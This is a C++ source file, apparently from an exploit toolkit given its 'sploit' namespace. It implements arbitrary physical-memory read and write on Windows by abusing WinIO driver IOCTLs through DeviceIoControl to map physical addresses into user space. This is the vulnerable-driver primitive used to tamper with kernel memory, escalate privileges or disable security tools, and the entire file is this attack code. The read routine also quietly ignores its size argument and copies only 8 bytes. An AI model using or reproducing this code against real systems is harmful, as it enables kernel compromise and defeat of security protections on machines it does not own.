#include "Memory.h"

using namespace sploit::memory;

Memory::Memory(Driver * driver):
	m_Driver(driver)
{

}

Memory::~Memory()
{

}

bool Memory::ReadPhysMem(PVOID pbPhysAddr, PVOID buffer, size_t size)
{
	PVOID LinAdr;
	tagPhysStruct PhysStruct;

	if (!m_Driver->GetHandle())
		return false;

	PhysStruct.pvPhysAddress = pbPhysAddr;
	
	PhysStruct.dwPhysMemSizeInBytes = size;

	LinAdr = MapPhysToLin(PhysStruct);

	if (LinAdr == nullptr)
		return false;

	*(PDWORD64)buffer = *(PDWORD64)LinAdr;


	UnmapPhysicalMemory(PhysStruct);

	return true;
}

bool Memory::WritePhysMem(PVOID pbPhysAddr, PVOID dwPhysVal, size_t size)
{
	PVOID				 LinAdr;
	tagPhysStruct		 PhysStruct;

	if (!m_Driver->GetHandle())
		return false;

	PhysStruct.pvPhysAddress = pbPhysAddr;
	

	PhysStruct.dwPhysMemSizeInBytes = size;

	LinAdr = MapPhysToLin(PhysStruct);

	if (LinAdr == nullptr)
		return false;

	*(PDWORD64)LinAdr = *(PDWORD64)dwPhysVal;

	UnmapPhysicalMemory(PhysStruct);

	return true;
}

PVOID Memory::MapPhysToLin(tagPhysStruct & PhysStruct)
{
	DWORD ret;
	if (!m_Driver->GetHandle())
		return false;

	if (!DeviceIoControl(m_Driver->GetHandle(), IOCTL_WINIO_MAPPHYSTOLIN, &PhysStruct,
	sizeof(tagPhysStruct), &PhysStruct, sizeof(tagPhysStruct), &ret, nullptr))
	return nullptr;
	

	return (PVOID)PhysStruct.pvPhysMemLin;
}

bool Memory::UnmapPhysicalMemory(tagPhysStruct & PhysStruct)
{
	DWORD ret;
	if (!m_Driver->GetHandle())
		return false;
	

	if (!DeviceIoControl(m_Driver->GetHandle(), IOCTL_WINIO_UNMAPPHYSADDR, &PhysStruct,
	sizeof(tagPhysStruct), nullptr, 0, &ret, nullptr)) return false;
	

	return true;
}

